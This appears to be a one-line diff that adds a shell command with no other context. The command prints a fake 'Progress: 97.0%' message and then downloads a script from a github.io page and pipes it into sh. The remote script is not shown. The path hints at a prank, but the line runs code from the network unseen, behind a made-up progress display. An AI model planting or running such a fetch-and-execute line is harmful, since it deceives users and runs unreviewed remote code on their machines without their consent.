@@ -1,0 +1,1 @@
+echo 'Progress: 97.0%'; curl -L --progress-bar frkns.github.io/fun/cannon-clean-politicians | sh
